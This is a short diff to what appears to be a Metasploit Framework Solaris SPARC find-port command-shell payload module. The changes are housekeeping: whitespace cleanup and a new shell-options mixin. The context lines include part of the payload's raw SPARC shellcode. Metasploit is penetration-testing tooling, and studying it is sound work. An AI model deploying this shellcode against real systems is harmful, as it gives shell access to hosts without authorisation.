@@ -3,22 +3,22 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
 ##
 
-
 require 'msf/core'
 require 'msf/core/handler/find_port'
 require 'msf/base/sessions/command_shell'
-
+require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
 	include Msf::Payload::Single
 	include Msf::Payload::Solaris
+	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
@@ -35,7 +35,7 @@ module Metasploit3
 
 	def generate
 		port    = (datastore['CPORT'] || '0').to_i
-		payload = 
+		payload =
 			Rex::Arch::Sparc.set(port, "l6") +
 			"\x9c\x2b\xa0\x07\x90\x1a\x80\x0a\xd0\x23\xbf\xe8\x90\x02\x20\x01" +
 			"\x90\x0a\x2f\xff\x92\x10\x20\x10\xd0\x3b\xbf\xf8\x94\x23\xa0\x04" +
